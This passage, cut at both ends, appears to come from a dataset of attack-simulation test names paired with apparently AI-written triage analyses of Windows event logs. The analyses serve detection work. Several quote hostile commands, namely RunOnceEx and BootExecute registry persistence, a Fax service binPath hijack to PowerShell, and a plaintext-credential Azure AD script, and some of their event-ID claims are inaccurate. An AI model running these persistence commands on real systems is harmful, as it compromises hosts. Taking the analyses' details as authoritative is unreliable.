    REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\Path\file.dll""
    ```
    This entry is indicative of trying to add persistence by running a DLL when the system restarts, a technique often used by malware for persistence.

- **Parent-Child Relationships:**
  - The relationship between `wsmprovhost.exe` and command line executes (`cmd.exe`, `reg.exe`) under a high integrity level and the `admin_test` user suggests elevated permissions being used in these operations, compatible with attempts to maintain persistence or perform unauthorized changes.

### Application Log:
- Two entries from `edgeupdate` services stopping do not provide specific concern unless these are unexpected service stops which could suggest malicious attempts to disrupt legitimate processes.

### System Log:
- **Kernel-General and Time-Service Logs:**
  - Correspond to the security logs indicating system time manipulation which is suspicious in context with potential attempts to hide activities or mislead analysis through timestamp alteration.

### Assessment:
- The use of typical admin utilities like `whoami`, execution of command line processes with registry modification, and system time changes collectively present a pattern that aligns with potential malicious activity aiming at maintaining stealth and persistence on the host system.

### Resolution:
- **SUSPICIOUS:** While the activities can be part of administrative tasks, the combination and context, especially the registry modification via command line, system time changes, and elevated permissions, suggest an anomaly that demands further investigation, especially focusing on verifying user activity and confirming the legitimacy of the registry changes and time adjustments.

### Guidance on How to Proceed:
1. **Immediate Actions:**
   - Review and verify user access logs to check for unusual activity by `admin_test`.
   - Investigate `C:\Path\file.dll` for legitimacy.
   - Confirm if the system time changes were intentional or part of known system updates.
   
2. **Long-Term Actions:**
   - Implement stricter auditing and monitoring on process executions with elevated privileges.
   - Consider additional user training on security posture and compliance with administrative actions.
   - Enhance endpoint protections to detect such nuanced registry changes or time manipulations more effectively. 

Keep monitoring for potential indicators of compromise and escalate to incident response if further suspicious indicators are discovered during deeper investigations."
EXO - Full access mailbox permission granted to a user,"### Analysis of Logs

#### Windows PowerShell Log Analysis:
- The PowerShell log entries show an execution of a PowerShell script that attempts to:
  1. Import the `ExchangeOnlineManagement` module.
  2. Use hardcoded credentials (`o365_user_test@contoso.com`) to connect to Exchange Online.
  3. Add mailbox permissions to a user (`operator@contoso.com`) for a mailbox (`delegate@contoso.com`) with Full Access rights.
  
  - **Suspicious Activity**: 
    - Use of hardcoded credentials in scripts is a security risk. 
    - Modifying mailbox permissions with administrative operations using scripts can indicate potential misuse or unauthorized access, especially if not a routine administrative task logged or monitored.
    - Execution of such scripts with `Connect-ExchangeOnline`, a common command for managing Exchange Online, should be scrutinized for origin and legitimacy.

#### Sysmon Log Analysis:
- The Sysmon logs detail several processes running under `SERVER002\admin_test`:
  - **Processes of Interest**:
    - `wevtutil.exe` and `conhost.exe` execution with User as `SERVER002\admin_test`.
      - `wevtutil.exe` is often used to enumerate, export, or clear event logs, which could be benign but needs context.
    - `whoami.exe` execution investigation, though typical, can help determine the current user.
    - **PowerShell Process Execution**: Multiple processes involving `powershell.exe` with a command line that matches the PowerShell log entry. This points towards an active engagement in running the same PowerShell script.

- **Suspicious Activity**:
  - Frequent `wevtutil.exe` executions suggest potential interest in event logs, possibly indicating clearing of logs or exporting sensitive information.
  - The PowerShell command execution should be aligned with regular administrative activities.

### Assessment & Conclusion
Analyzing the PowerShell log, coupled with Sysmon entries, highlights some activities that warrant further investigation:
- Hardcoded credentials and administrative actions on mailboxes through PowerShell scripts can pose significant risks.
- Usage of `wevtutil.exe` might be benign in routine administrative tasks but can be suspicious if logs were altered. Regular monitoring and checks are advised.

### Recommended Resolution: **SUSPICIOUS**
- Investigate and confirm whether the script execution and `wevtutil.exe` usage align with documented administrative activities.
- Validate the purpose and authorization of the exact PowerShell script executed.
- Consider securing script execution policies and handling of credentials to prevent hardcoded exposure and potential exploitation.
- Engage in user verification and refine monitoring accordingly.

Proceed with the investigation to verify these activities against known administrative tasks or explore any potential misuses."
Process Hollowing in Go using CreateProcessW and CreatePipe WinAPIs,"**Analysis of Windows Event Logs:**

**1. Sysmon Logs:**
- **Frequent Execution of `wevtutil.exe` and `conhost.exe`:** Multiple instances of `wevtutil.exe` and `conhost.exe` are being executed in quick succession by the user `SERVER002\\admin_test`. While `wevtutil.exe` is a legitimate Windows utility for managing event logs, its frequent and rapid triggering is unusual and could indicate an attempt to manipulate or export event logs.
- **Use of PowerShell:** There is a suspicious execution of PowerShell with a command linking to `CreateProcessWithPipe.exe`, which appears from a temporary folder. This exhibits characteristics of a potentially malicious activity, such as process injection or an unauthorized task being executed through PowerShell.
- **Execution of `werfault.exe`:** This is sometimes used in malware operations for error handling exploitation or process manipulation; its linkage with the suspicious PowerShell execution increases the concern.

**2. System Logs:**
- **Time Discrepancy Detected:** There are two logged instances of time shifting in the system time (`EventID 1`). Such discrepancies can be leveraged by attackers to mask their activities effectively by altering timestamp records.

**3. Windows PowerShell Logs:**
- **PowerShell Execution:** The logs are consistent with those recorded in the Sysmon logs regarding the specific ersatz operation using `CreateProcessWithPipe.exe`.

**4. Security Logs:**
- **Time Change Notification:** This confirms the manipulation of system time, overlapping with the observations from the System logs.

**5. Application Logs:**
- **Software Protection Log Entry (EventID 16384):** There’s a record by the Software Protection Platform Service, which seems unrelated at first glance but merits attention in context with the time change and potentially unauthorized operations.

**Assessment:**
The logs contain multiple indicators that are concerning, specifically:
- Abnormal high-frequency execution of event-related utilities.
- PowerShell activity that can be linked to potential threats due to the use of a temporary folder and coupled executables.
- System clock manipulation, which is a classic indicator of potential compromise to alter or obfuscate logs or activities.

**Resolution:** **SUSPICIOUS**
- **Guidance:** This activity does not definitively confirm compromise but is highly suspicious and merits further investigation. Detailed follow-up actions are advised:

1. **Investigate Process Details:**
   - Check the details and history of `CreateProcessWithPipe.exe` and any related files within the temp directories.
   
2. **Review User Activity:**
   - Conduct a thorough audit of `SERVER002\\admin_test` user activity for any unauthorized access or behavior during the period these logs were generated.

3. **Monitor Network Traffic:**
   - Look for any unusual outbound traffic from `Server002` that might indicate a remote connection or data exfiltration attempts.

4. **Check System Integrity:**
   - Verify the system clock settings and check for any scheduled tasks or processes that might have been used to alter system time.

5. **Scan for Malware:**
   - Run updated antivirus and anti-malware scans focusing on temporary directories and the mentioned executables for any malicious activities or signatures.

Additional caution is warranted, and system logs should be monitored for recurring or new activities matching these patterns."
Service Installation CMD,"## Detailed Analysis of the Logs

### Initial Observations:
1. Logs show events related to process creation, service control, and various system utilities being launched on `Server002`.
2. The user account `SERVER002\\admin_test` appears consistently across most Sysmon events.
3. Several processes are executed in a short period, some utilizing administrative tools such as `sc.exe`.

### Suspicious Activities:
1. **Windows PowerShell Execution:**
   - PowerShell is a known tool for both administrative tasks and misuse by attackers. There is an event indicating `powershell.exe` was executed by `SERVER002\\admin_test`. There is no direct evidence of malicious scripts or unusual command-line arguments in the fragmented logs shown here, but the presence of PowerShell warrants further investigation.

2. **Service Creation with `sc.exe`:**
   - A new service named `fileTestService_CMD` is created using `sc.exe` with the binary path `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.003\\bin\\fileService.exe`. The temporary path (`Temp\\file\\data.003`) is unusual for service executables, often indicative of spurious or rogue services. Moreover, services starting automatically and executing from temp directories can be a sign of persistence mechanisms used by malware.
   
3. **Command-line Execution:**
   - `cmd.exe` executed a command-line to create this service, which included commands such as `sc.exe create` and `sc.exe start fileTestService_CMD`. This sequence indicates an intent to not only install but immediately run the service, increasing its suspicion.

4. **Execution as System:**
   - The `fileService.exe` runs under the `NT AUTHORITY\\SYSTEM` account, which holds high privileges. Executing unknown binaries as `SYSTEM` can be a severe security risk if the executable is malicious.

### Benign Activities:
1. **Microsoft Edge Update:**
   - The logs include several events that involve Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`). These events appear normal and consistent with legitimate system update operations, including both service and setup processes.

2. **Normal System Utilities:**
   - Utilities like `wevtutil.exe`, `hostname.exe`, `whoami.exe`, and `conhost.exe` appear multiple times in the logs with expected paths and descriptions. These executions, without any overtly suspicious command-line usage, do not appear immediately concerning.

### Assessment:

Based on the analysis, the creation and execution of the service `fileTestService_CMD` with a binary from a temporary directory suggests potentially unauthorized or malicious activity. This, combined with the use of administrative tools and execution under the `SYSTEM` account, represents a red flag indicating possible compromise or attempted persistent backdoor installation. Edge updates and routine system processes seem benign.

### Resolution:
**SUSPICIOUS**
- The activity with `fileTestService_CMD` requires further investigation to ascertain whether this service was intentionally created by an authorized process or user or if it represents an unauthorized attempt to establish persistence or execute malicious payloads.
- Recommend reviewing associated files, analyzing the file hash of `fileService.exe`, and conducting a deeper forensic analysis of `Server002`.

### Guidance:
- Investigate the intent and origin of the `fileService.exe` found in the temporary directory.
- Verify with system administrators if the service creation was part of an authorized procedure.
- Isolate `Server002` for deeper forensic analysis to prevent any lateral movement or further compromise within the network.
- Consider updating endpoint detection and response solutions to hunt for similar file paths or service creation attempts across other systems."
Process Hollowing using PowerShell,"### Detailed Analysis

After a thorough examination of the provided logs, several activities stand out, indicating possible malicious behavior. Below is an assessment of key findings:

#### 1. **Privileged Logins:**
- **Event ID 4624 & 4672** show privileged logins using the account `admin_test` with elevated privileges:
  - **Privileges Acquired:** `SeSecurityPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, `SeTakeOwnershipPrivilege`, `SeDebugPrivilege`, `SeSystemEnvironmentPrivilege`, `SeLoadDriverPrivilege`, `SeImpersonatePrivilege`, `SeDelegateSessionUserImpersonatePrivilege`.
  - The granting of extensive privileges, especially `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, to a non-standard account raises suspicion.

#### 2. **Process Creation and Execution:**
- **Sysmon Event ID 1 & 5** document the execution of several processes by `admin_test`. Key activities include:
  - **PowerShell Execution:** An instance of `powershell.exe` runs with a suspicious script `Start-Hollow.ps1`, intended for process hollowing, starting `notepad.exe` and hollowing `cmd.exe`. This behavior is indicative of an attempt to conceal malicious activities within legitimate processes.
  - **Wevtutil Executions:** Multiple instances of `wevtutil.exe` executed by `admin_test` could imply attempts to manipulate or clear event logs to hamper intrusion detection efforts.

#### 3. **Network and Impersonation Indicators:**
- The logon sessions leverage **Logon Type 3**, indicative of network logins, suggesting remote attempts or lateral movement on the network.
- The use of NTLM for authentication can sometimes suggest weak security practices, although not inherently malicious by itself in this context.

#### 4. **Additional Observations:**
- Execution of `whoami.exe` and `hostname.exe` could be recon activities to gather information in preparation for further actions.
- Files and commands executed from user directories, particularly from `C:\Users\ADMIN_~1\AppData\Local\Temp`, often suggest suspicious activity as this location is a common drop point for malicious files.

### Conclusion

Based on the analysis:

- The combination of the execution of a PowerShell script for process hollowing, extensive privilege grants, and manipulation of event logs strongly indicates malicious activity on the system.
- The behavior of the `admin_test` account suggests it might have been compromised or is being used by an attacker to carry out malicious operations.

### Resolution: **MALICIOUS**

### Recommendations:

1. **Immediate Containment:**
   - Isolate the affected host to prevent further movement within the network.
   - Disable or review the `admin_test` account for any unauthorized access patterns.

2. **Thorough Investigation:**
   - Examine the full scope of potential compromise across the network.
   - Review recent changes to security policies and permission assignments.

3. **Remediation:**
   - Clean up any malicious files and scripts identified on the host.
   - Implement a more rigorous authentication method, possibly involving a temporary block on NTLM.

4. **Improve Security Posture:**
   - Conduct regular audits of accounts and privileges on critical systems.
   - Consider implementing security solutions that enhance visibility into unusual activities and can automate the detection of process hollowing. 

5. **Forensic Analysis:**
   - If possible, conduct a forensic analysis of the host to understand the attack vector fully and trace any data breaches or exfiltration."
Remote Process Injection with Go using RtlCreateUserThread WinAPI,"After carefully analyzing the provided logs, I have identified the following points of interest:

1. **System Log:**
   - There are events related to time changes (`EventID: 1`), which usually represent normal system operations, potentially due to time synchronization activities. No immediate indications of malicious activities are present in these entries.

2. **Windows PowerShell Log:**
   - The command being executed in multiple events is worth noting. It involves `powershell.exe` starting a process with `werfault.exe` and using `RtlCreateUserThread.exe` with the `-debug` flag. It is unusual for PowerShell to execute a process via `werfault.exe`, which is typically a Windows Error Reporting executable. The use of `RtlCreateUserThread` suggests an attempt to manipulate or inject code into a process. This behavior is highly suspicious and indicative of process injection techniques often used by malware or attackers for stealthy execution.

3. **Application and Sysmon Logs:**
   - The creation of `werfault.exe` and subsequent processes (`EventID: 1`) with modifications to the process environment using PowerShell suggests a methodology that can be leveraged for fileless malware or in-memory attacks to avoid disk-based detection mechanisms. The sequence of processes does not align with typical system behavior.

4. **Security Log:**
   - The presence of privileged actions (EventID: 4672), showing the account `SERVER002\admin_test` with advanced privileges (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.) right before and after the PowerShell events, suggests potential misuses of administrative rights that could correlate with suspicious activities logged in the PowerShell entries.

### Conclusion:
The PowerShell activities, coupled with privileged actions and process spawns observed in the logs, exhibit behavior that deviates from normal operations. The sequence appears structured for stealth and privilege misuse, common factors in authorized intrusions or malware execution patterns.

### Resolution: **MALICIOUS**
The log entries strongly suggest malicious activity due to the unusual and suspicious execution of processes initiated through PowerShell using advanced code manipulation techniques. Immediate containment, assessment of the affected system, and review of potential compromise vectors should be performed. Follow-up actions should include revocation of potentially compromised credentials, strengthening PowerShell logging policies, and conducting a full forensic analysis to ensure the environment's security is reinstated."
Portable Executable Injection,"Upon reviewing the provided logs, several events and activities stand out as suspicious, potentially indicative of malicious activity:

1. **Privileges Assigned**:
    - Event ID 4672 from the Security Log shows that the user `admin_test` was granted a wide array of privileges, including SeDebugPrivilege and SeImpersonatePrivilege. These are powerful privileges which can be used for privilege escalation and unauthorized access.

2. **Unusual PowerShell Activity**:
    - The PowerShell logs reveal that a script was executed to start a process `RedInjection.exe` using PowerShell. The file path is in a temporary directory and involves a possible injection executable, which is suspicious and typically indicative of malicious activities.

3. **Anomalous Process Execution**:
    - Sysmon logs confirm the execution of `RedInjection.exe` from a temporary directory, which is further flagged as suspicious. Additionally, this process spawned `notepad.exe`, a common tactic used by malware to camouflage its activities by launching benign-looking processes.

4. **PowerShell Execution Context**:
    - The PowerShell activity was executed with administrator privileges, providing an elevated execution context, which increases the risk of critical changes or data exfiltration if the process is malicious.

5. **Network Connections**:
    - In Security Log Event ID 4624, there was a successful login for user `admin_test` via a network logon (LogonType 3). This, coupled with the execution of suspicious scripts, suggests potential remote exploitation or command execution.

Overall, these activities collectively form a pattern often associated with malicious intent, involving privilege escalation, use of PowerShell for injecting or running potentially harmful processes, and generating network connections that could indicate lateral movement or external command and control communication.

**Resolution: MALICIOUS**

**Assessment and Guidance**:
- It is highly likely that this activity is indicative of a compromised host. Immediate actions should be taken to isolate the system from the network to prevent further unauthorized access or data breaches.
- Perform a detailed forensic analysis on the host, especially focusing on the `RedInjection.exe` file to gather more information about the potential malware.
- Review and change credentials used on this host, paying special attention to those that have been granted elevated privileges.
- Implement additional monitoring and logging to detect similar activities, and review security policies to prevent future exploitation through similar methods.
- Consider notifying any relevant parties or authorities as appropriate for the scope and impact of the breach."
Domain Account and Group Manipulate,"### Detailed Analysis of the Logs

Upon reviewing the provided Windows event logs, several entries were identified as noteworthy:

1. **Suspicious PowerShell Execution:**
   - **Sysmon Logs:**
     - **Event ID 1** and **PowerShell Logs** indicate that a PowerShell script was executed that uses `Get-Random` to generate numbers and then creates a new Active Directory user (`New-ADUser`) with these random parameters. This script also attempts to add the new user to the 'Domain Admins' group using `Add-ADGroupMember`.
   - **Analysis:**
     - This activity is highly suspicious as it involves adding a random account to a high-privilege group. This could potentially indicate malicious behavior attempting to establish persistence or escalate privileges within the environment.

2. **Unusual Process Executions:**
   - **Sysmon Logs:** 
     - Multiple instances of sensitive Windows utilities such as `conhost.exe`, `wermgr.exe`, `wevtutil.exe`, and others were run under the account `SERVER002\\admin_test`.
   - **Analysis:**
     - The repeated use of these utilities alongside PowerShell execution suggests an attempt to cover tracks or gather information from the system.

3. **Security Log Entries:**
   - Various security events indicate normal system activity with logs of system processes executing with no explicit signs of privilege escalations such as `LogonType` 5 indicating service-only logon activity, or `GlobalServiceProvider` indicating configuration and task host operations that are benign.

4. **Edge Update and Other System Process Activity:**
   - Logs show routine updates being handled by Microsoft Edge Update Service which is typical and expected as part of system maintenance.

### Assessment and Risks Identified
- **Potential Compromise Risk:**
  - The PowerShell activity, specifically the attempted creation of a user account and adding it to 'Domain Admins', presents a serious security risk, indicative of a potential compromise or malicious intent.
  
### Guidance on How to Proceed
- **Immediate Actions:**
  - Disable the newly created accounts if they exist and were unintended.
  - Review the domain's administrative accounts for unauthorized members.
  - Conduct a sweep of systems to identify additional malicious scripts or accounts.
- **Further Investigation:**
  - Conduct a detailed audit of logs around the time of the suspicious PowerShell execution.
  - Inspect configuration settings and policies for unauthorized changes.

### Conclusion
**Resolution:** **MALICIOUS**

Given the suspicious execution of a PowerShell script that attempts to add a new user to Domain Admins, alongside the frequent execution of administrative utilities by a non-standard administrative user account, I conclude that the events strongly suggest malicious activity and potential system compromise. The organization should proceed with containment, eradication, and recovery steps while conducting further investigation into the incident."
UUID custom process Injection,"In analyzing the provided logs, several aspects of the recorded activities stand out, necessitating deeper scrutiny:

### Suspicious Behavior:

1. **PowerShell Execution**: 
   - In multiple logs, there's a presence of PowerShell execution with suspicious command lines, notably:
     - The command `""powershell.exe & {Start-Process \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\bin\\x64\\uuid_injection.exe\"" Start-Sleep -Seconds 7; Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force}` suggests an attempt to run a potentially malicious executable `uuid_injection.exe`. The path where this executable resides (a temporary folder within the AppData directory) further raises alarm.
   - The fact that processes such as `uuid_injection.exe` and similar scripts were executed using PowerShell, and were structured to forcefully terminate Notepad processes, could indicate malware deployment tactics that leverage PowerShell for stealthy operations.
  
2. **Sysmon Logs**:
   - The logs trace the creation of the process `uuid_injection.exe`, initiated by PowerShell, persisting across several entries (`ProcessGuid: dbf410b3-e7a5-6717-ce00-000000003900`).
   - The use of `conhost.exe` repeatedly in the sequence may signal attempts to camouflage command-line operations, as `conhost.exe` can be used by malicious scripts to blend in with legitimate console host processes.
  
3. **Use of Temporary Files and Unverified Executables**:
   - Temporary directories are often used by malware to execute or unpack files. The execution of `uuid_injection.exe` from a temporary path is consistent with some malware behaviors that try to avoid attracting attention by not installing more visibly within system or program directories.

### Indicators of Malicious Activity:

1. **Process Relationship and Command Lines**:
   - The logs highlight multiple uses of processes starting from `PowerShell`, leading to executions of `uuid_injection.exe`. The progression of steps typically matches known attack patterns where initial PowerShell activity is used to launch or load potentially harmful binaries like `uuid_injection.exe`.
   - The command attempts injected through PowerShell to alter or control other system components (`Get-Process -Name Notepad | Stop-Process -Force`) hint at hostile intentions, potentially to disrupt typical operations for either covertness or disruptive purposes.

2. **Security and System Logging**:
   - Security log entries (e.g., Event IDs 4624 and 4672) show standard logon types with elevated privileges (administrative-level tokens like SeDebugPrivilege) but may reflect common system activities alongside potentially unwanted activities if these were gained during the suspicious process execution cycles.
   - There is consistent referencing back to SYSTEM or NT AUTHORITY users, suggesting that the processes were attempting to operate under higher privilege levels to avoid detection or to achieve a broader scope of system control.

### Conclusion and Recommendation:

Based on the analysis of the logs and identified suspicious behaviors, there are significant indicators suggestive of a compromised environment. The presence and execution flow of `uuid_injection.exe` using PowerShell and other system utilities from obscure locations strongly suggest hostile activity.

- **Resolution**: **MALICIOUS**

### Guidance on How to Proceed:

1. **Immediate Isolation**: Disconnect the affected machine from the network to prevent further spread or communication by potential malware.

2. **Forensic Analysis**: Conduct an in-depth forensic investigation, preserving volatile and non-volatile data, to understand the scope and purpose of the compromise.

3. **Comprehensive System Scan**: Utilize robust endpoint detection and response (EDR) tools to scan for additional indicators of compromise across the network.

4. **Review and Reinforce Policies**: Analyze current network and access policies to adjust permissions, especially concerning PowerShell usage and scripting capabilities, to restrict unauthorized executions.

5. **Threat Intelligence Sharing**: Consider sharing findings with broader security communities for collaborative threat intelligence and better prevention strategies against similar incursions in the future."
Azure AD - adding service principal to Azure AD role,"### Analysis of the Logs

#### Overview:

The logs provided from the Windows system encompass several different event sources, including Application, Sysmon, System, Windows PowerShell, and Security logs. Critical investigation points include Sysmon process creation events, unusual PowerShell activity, and updates history that often signify routine operations or potential system tampering.

#### Suspicious and Anomalous Behavior:

1. **Sysmon Logs:**
   - Multiple instances of process creation (Event ID: 5) show legitimate system utilities such as `powershell.exe`, `wevtutil.exe`, and `conhost.exe` being invoked by a user identified as `SERVER002\admin_test`. This user seems to have high integrity level access, performing operations right after each other in a short time span.
   - Of particular interest is a `powershell.exe` execution with command lines importing `AzureAD`, setting up a credential object, and connecting to Azure Active Directory:
        ```powershell
        powershell.exe & {Import-Module -Name AzureAD
        $PWord = ConvertTo-SecureString -String \""p4sswd\"" -AsPlainText -Force
        $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \""jonh@contoso.com\"", $Pword
        Connect-AzureAD -Credential $Credential
        ...
        }
        ```
   - The powershell activity includes operations that could modify user roles and attributes in Azure AD, which should not be a generic operation, especially given the use of plaintext credentials — evidencing poor security practices.

2. **Windows PowerShell Logs:**
   - Echoes the suspicious nature seen in the Sysmon log with the `PowerShell` events reiterating a sequence of actions corresponding to Azure service connections.

3. **System Logs:**
   - Contain evidence of software updates via the Windows Update Client. These logs appear benign as they track application updates typical of system maintenance.

4. **Security Logs:**
   - The lack of entries in the security log section should raise some concerns as this is unexpected in a typical audit of such a system and may be indicative of intentional log tampering or deletions to obscure malicious activities.

#### Malicious Activity or Compromise:

The evidence points towards the potential misuse of PowerShell for unauthorized administrative tasks on Azure AD using known credentials in plaintext, which is a glaring security risk. The absence of Security log entries is suspicious, indicative of deliberate tampering to hide evidence of access or changes.

### Assessment and Conclusion:

- **Resolution:** **SUSPICIOUS**

Given the flagrant execution of PowerShell tasks manipulating Azure AD with insecure practices, along with suspicious absence of Security logs that are essential for audit trails, the activities warrant further investigation. There is no concrete evidence of active compromise but considering best practices, these patterns deviate from what is considered a safe operating standard, thus should be treated as suspicious.

### Guidance on How to Proceed:

1. **Initiate an Incident Response Process:**
   - Further analyze and review user activities for `SERVER002\admin_test`, especially around Azure AD and PowerShell usage.
   - Verify the user's access permissions and ensure they align with their role and function within the organization.

2. **Audit and Scrutinize Logs:**
   - Retrieve and restore potentially altered or deleted Security logs.
   - Inspect logs around the time of the PowerShell activities for more context.

3. **Security Enhancement:**
   - Implement proper password management policies, eliminating plaintext credentials in scripts.
   - Harden PowerShell execution policies and restrict high-level access to necessary personnel.

4. **Engage Azure AD Security:**
   - Implement multi-factor authentication (MFA) for all Azure AD user accounts.
   - Conduct a review of Azure AD roles and permissions to ensure no unauthorized assignments were enabled. 

This proactive approach will safeguard against any latent threats that may have not yet manifested overtly."
Domain Password Policy Check: Only Two Character Classes,"Upon reviewing the provided Windows event logs, the following observations are noted:

### Observations:

#### 1. **PowerShell Activity:**
- A PowerShell script was executed that appears to access and possibly alter a user's password. 
- The script retrieves a credential from a file located in the user's local app data directory and compares it to a new password.
- If the password is the same as the one stored, it logs a message and exits without making changes.
- If different, it attempts to change the Active Directory password.
- PowerShell activity in event logs is often worth deeper investigation, especially if it involves credentials and password changes which could indicate attempted credential theft or lateral movement.

#### 2. **Security Logs:**
- Several events related to user enumeration (Event ID 4798) and attempts to read credentials (Event ID 5379) occurred.
- Event ID 4672 shows a logon with special privileges by the SYSTEM account.
- Event ID 4624 indicates successful logons, predominantly reflecting SYSTEM user sessions.
- There is also a series of events around attempts to retrieve credentials from Microsoft accounts and Windows Live which failed with a return code `3221226021`, indicating potential unauthorized access attempts.

#### 3. **Sysmon Logs:**
- The processes like `wevtutil.exe` and `conhost.exe` associated with user `admin_test` executing sequentially could suggest log clearing attempts or manipulation.
- A notable PowerShell session is recorded indicating possible use of PowerShell for a scripted task, correlating with the earlier observed suspicious PowerShell activity.

### Suspicious Behavior:
- Usage of PowerShell to handle credentials and the script's logic indicates a potential password management program or a more malicious script for credential manipulation.
- Frequent executions and process handles towards log operations suggest potential log tampering attempts.
- Multiple failed credential retrieval attempts raise concerns over unauthorized access attempts, potentially indicating brute force or password spraying attempts.

### Assessment:
- **SUSPICIOUS**: The activity noted in the logs is unusual and indicates potential security threats, such as unauthorized password changes and manipulation of system logs which merit further investigation.

### Recommendations:
- Undertake a comprehensive review of the PowerShell scripts executed on this host for unauthorized changes or malicious logic.
- Check the integrity of user credential files and ensure no unauthorized modifications have been made.
- Audit accounts with privileged access, especially the `SYSTEM` account, to ensure no compromise has occurred.
- Review firewall and network logs for any unauthorized access attempts corresponding to the timestamps observed.
- Implement additional monitoring and alerts around PowerShell usage and sensitive operations.

**Conclusion**: The logs show behaviors consistent with potential compromise or attempted compromise; thus, a detailed investigation is required to confirm security status and mitigate potential threats."
PowerShell Registry RunOnce,"Based on the analysis of the provided log data, there are several indicators of potential malicious activity:

1. **PowerShell Execution**: There's a series of events in which `powershell.exe` is executed with a command attempting to download a script from a GitHub URL. This behavior, especially when using `Invoke-Expression` (IEX) to execute a downloaded script, is commonly associated with malicious activity, as it could allow an attacker to execute arbitrary commands or scripts remotely.

2. **Privilege Escalation and Privileged Actions**: The logs indicate multiple instances of Event ID 4672, which reveals the assignment of high-privilege security rights (e.g., `SeDebugPrivilege`, `SeBackupPrivilege`, etc.) to the user `admin_test`. These privileges can potentially be used in suspicious or harmful ways, depending on the context and corresponding activities.

3. **Usage of NTLM Authentication**: The logs reveal NTLM logon events via `LogonType 3` which can be legitimate but is worth noting because NTLM is less secure than more modern authentication methods, and if used over an insecure network, it can be vulnerable to relay attacks.

4. **Execution of System Utilities**: Tools like `whoami.exe` and `hostname.exe` were run multiple times within a short time, often used in the enumeration phase by threat actors to gather system information.

5. **Service and Process Behavior**: The presence and repeated executions of `wevtutil.exe` and `conhost.exe` shortly before `powershell.exe` execution could serve legitimate purposes, but in conjunction with other logs might indicate evasive measures or environment preparation for subsequent execution of downloaded script.

6. **Sequence of Process Creations**: There are consistent and rapid process creations and executions pattern indicated in the logs for tools like `MicrosoftEdgeUpdate.exe` and related executables. While it is not uncommon for application updates, rapid execution can sometimes point to exploitation during known vulnerabilities in auto-update processes if it coincides with untrusted downloads.

Conclusively, the presence of a PowerShell script using web requests to download and potentially execute code without direct supervision strongly suggests malicious intent. The use of admin privileges and rapid utility executions could indicate lateral movement or elevated privilege use by unauthorized users.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediately isolate the potentially compromised system from the network to prevent further propagation.
- Conduct a full forensic investigation to determine the entry point and scope of the compromise.
- Review and possibly strengthen the security policies regarding PowerShell usage, NTLM authentication, and privilege assignments.
- Implement logging and alerting mechanisms to detect similar patterns in the future.
- Consider a comprehensive review and possibly tighten Active Directory and user access controls.
- Advise users to follow security best practices including patching, using strong credentials, and consistent auditing."
Modify BootExecute Value,"Upon analyzing the provided Windows event logs, here are my findings and interpretation:

### Analysis:

1. **PowerShell Logs:**
   - The PowerShell logs show a command execution that involves checking for the existence of a registry backup file and creating a registry backup if it does not exist, then modifying the registry's `BootExecute` key.
   - Command: `powershell.exe &{ if (!(Test-Path ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.001\src\SessionManagerBackup.reg"")) { reg.exe export ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager"" ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.001\src\SessionManagerBackup.reg"" /y } Set-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager"" -Name ""BootExecute"" -Value ""autocheck autoche *"" -Type MultiString }`
   - Observations: Modifying the `BootExecute` registry key can affect system boot parameters, which is potentially suspicious but could also be benign if part of a legitimate maintenance script.

2. **Security Logs:**
   - Two events (ID: 4616) indicate the changing of the system time by the process `svchost.exe`, associated with the `LOCAL SERVICE` account.
   - Observations: System time changes can be legitimate (e.g., synchronization with a time server) but may also indicate attempts to disrupt log timestamps for malicious activities.

3. **Sysmon Logs:**
   - Multiple processes involving `wevtutil.exe` and `conhost.exe` executed by `admin_test` seem routine and are likely part of regular administrative or operational tasks.
   - Microsoft EdgeUpdate processes and setups are seen frequently in the logs.
   - `reg.exe` is used in conjunction with PowerShell to export registry keys, aligning with the PowerShell commands observed.
   - `whoami.exe` and `hostname.exe` were executed, which are common for querying user and system information.

4. **Application Logs:**
   - Microsoft Edge Update service starts and stops are logged as expected with no signs of issues.

5. **System Logs:**
   - Reflect system time changes likely associated with NTP synchronization, consistent with the Security log entries.

### Suspicious or Anomalous Behavior:

- **PowerShell Script Execution:** The use of PowerShell to interact with the registry (`BootExecute` setting) could be suspicious if not part of standard operations or maintenance activities.
- **Time Changes in Security Logs:** Requires verification to ensure these changes align with expected system behavior (such as synchronization rather than manual adjustments).

### Assessment:

While the PowerShell script modifying registry keys could indicate potential misuse, there is no definitive evidence of malicious intent based on the provided logs alone. The time changes observed in the logs seem routine but should be validated against system updating policies. 

### Recommendations:

- Validate the PowerShell script's purpose with system administrators to ensure it is part of an approved process.
- Confirm the source and legitimacy of system time changes with IT operations or system auditing teams to ensure they align with policy.

Based on the available information, the situation is best described as:

**Resolution: SUSPICIOUS** - Given the registry operations via PowerShell and the change of system time, further validation and potential investigation are required to categorize these actions definitively."
Modify Fax service to run PowerShell,"In analyzing the log entries provided, I have identified some activity that stands out as potentially malicious or worthy of further investigation. Below is a detailed analysis:

### Sysmon Logs:

1. **Use of `wevtutil.exe` and `conhost.exe`:**
   - Wevtutil is a legitimate utility used to manage event logs, but its execution in rapid succession alongside conhost.exe (Console Host) can be indicative of log tampering or suppression activities. This is suspicious as such behavior might be used to cover tracks following a malicious action.

2. **PowerShell Execution via sc.exe:**
   - A command was executed using `cmd.exe` that attempts to change the service configuration of the ""Fax"" service to run a PowerShell command. This involves the command: 
     - `sc config Fax binPath= ""C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -c \""write-host 'data.003 Test'\""""`
   - This behavior is highly suspicious as it manipulates a service (Fax) which is commonly used in privilege escalation attempts or persistence mechanisms by attackers. It merits further investigation due to the deviation from regular service operations.

3. **Multiple Edge Update Executions:**
